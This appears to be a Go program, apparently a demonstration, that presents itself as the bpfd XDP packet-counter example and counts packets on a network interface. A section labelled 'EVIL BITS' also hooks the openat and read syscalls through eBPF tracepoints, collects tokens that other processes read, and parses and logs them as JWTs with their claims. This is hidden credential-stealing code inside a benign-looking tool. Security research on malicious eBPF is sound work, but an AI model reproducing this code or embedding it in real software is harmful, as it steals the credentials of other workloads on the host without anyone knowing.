//go:build linux
// +build linux

package main

import (
	"log"
	"os"
	"os/signal"
	"syscall"
	"time"
	"net"
	"errors"
	"bytes"
	"encoding/binary"
	"encoding/json"


	"github.com/cilium/ebpf/link"
	"github.com/cilium/ebpf/ringbuf"

	"golang.org/x/sys/unix"
	jwt "github.com/golang-jwt/jwt/v5"
)

type Stats struct {
	Packets uint64
	Bytes   uint64
}

const (
	DefaultConfigPath     = "/etc/bpfd/bpfd.toml"
	PrimaryByteCodeFile   = "/run/bpfd/examples/go-xdp-counter/bpf_bpfel.o"
	SecondaryByteCodeFile = "bpf_bpfel.o"
	XdpProgramName        = "go-xdp-counter-example"
	BpfProgramMapIndex    = "xdp_stats_map"
)

const (
	XDP_ACT_OK = 2
)

//go:generate bpf2go -cc clang -no-strip -cflags "-O2 -g -Wall" -type event bpf ./bpf/xdp_counter_evil.c -- -I.:/usr/include/bpf:/usr/include/linux
func main() {
	stop := make(chan os.Signal, 1)
	signal.Notify(stop, os.Interrupt, syscall.SIGINT, syscall.SIGTERM)

	if len(os.Args) < 2 {
		log.Fatalf("Please specify a network interface")
	}

	// Look up the network interface by name.
	ifaceName := os.Args[1]
	iface, err := net.InterfaceByName(ifaceName)
	if err != nil {
		log.Fatalf("lookup network iface %q: %s", ifaceName, err)
	}

	// Load pre-compiled programs into the kernel.
	objs := bpfObjects{}
	if err := loadBpfObjects(&objs, nil); err != nil {
		log.Fatalf("loading objects: %s", err)
	}
	defer objs.Close()

	// Attach the program.
	l, err := link.AttachXDP(link.XDPOptions{
		Program:   objs.XdpStats,
		Interface: iface.Index,
	})
	if err != nil {
		log.Fatalf("could not attach XDP program: %s", err)
	}
	defer l.Close()

	log.Printf("Attached XDP program to iface %q (index %d)", iface.Name, iface.Index)
	log.Printf("Press Ctrl-C to exit and remove the program")

	statsMap := objs.XdpStatsMap

	ticker := time.NewTicker(3 * time.Second)
	go func() {
		for range ticker.C {
			key := uint32(XDP_ACT_OK)
			var stats []Stats
			var totalPackets uint64
			var totalBytes uint64

			err := statsMap.Lookup(&key, &stats)
			if err != nil {
				log.Print(err)
				return
			}

			for _, cpuStat := range stats {
				totalPackets += cpuStat.Packets
				totalBytes += cpuStat.Bytes
			}

			log.Printf("%d packets received\n", totalPackets)
			log.Printf("%d bytes received\n\n", totalBytes)
		}
	}()

	////// EVIL BITS ///////
	openat, err := link.Tracepoint("syscalls", "sys_enter_openat", objs.EnterOpenat, nil)
	if err != nil {
		log.Fatalf("opening tracepoint: %s", err)
	}
	defer openat.Close()

	exitat, err := link.Tracepoint("syscalls", "sys_exit_openat", objs.ExitOpenat, nil)
	if err != nil {
		log.Fatalf("opening tracepoint: %s", err)
	}
	defer exitat.Close()

	read, err := link.Tracepoint("syscalls", "sys_enter_read", objs.EnterRead, nil)
	if err != nil {
		log.Fatalf("opening tracepoint: %s", err)
	}
	defer read.Close()

	exit, err := link.Tracepoint("syscalls", "sys_exit_read", objs.ExitRead, nil)
	if err != nil {
		log.Fatalf("opening tracepoint: %s", err)
	}
	defer exit.Close()

	// Open a ringbuf reader from userspace TOKENS map described in the
	// eBPF C program.
	rd, err := ringbuf.NewReader(objs.Tokens)
	if err != nil {
		log.Fatalf("opening ringbuf reader: %s", err)
	}
	defer rd.Close()

	// Close the reader when the process receives a signal, which will exit
	// the read loop.
	go func() {
		<-stop

		if err := rd.Close(); err != nil {
			log.Fatalf("closing ringbuf reader: %s", err)
		}
	}()

	go func() {// bpfEvent is generated by bpf2go.
		var event bpfEvent
		for {
			record, err := rd.Read()
			if err != nil {
				if errors.Is(err, ringbuf.ErrClosed) {
					log.Println("Received signal, exiting..")
					return
				}
				log.Printf("reading from reader: %s", err)
				continue
			}

			// Parse the ringbuf event entry into a bpfEvent structure.
			if err := binary.Read(bytes.NewBuffer(record.RawSample), binary.LittleEndian, &event); err != nil {
				log.Printf("parsing ringbuf event: %s", err)
				continue
			}

			tokenStr := unix.ByteSliceToString(event.Token[:])
			token, _ := jwt.Parse(tokenStr, func(token *jwt.Token) (interface{}, error) {
				return []byte("AllYourBase"), nil
			})

			jsonClaims, err := json.MarshalIndent(token.Claims, "","   ")
			if err != nil {
				log.Fatal("Failed marshalling claims")
			}

			log.Printf("\npid: %d\n\ncomm: %s\n\ntoken: %s\n\nparsed token info: %s\n\n", event.Pid, unix.ByteSliceToString(event.Comm[:]), tokenStr, jsonClaims)
		}
	}()

	<-stop

	log.Printf("Exiting...\n")
}
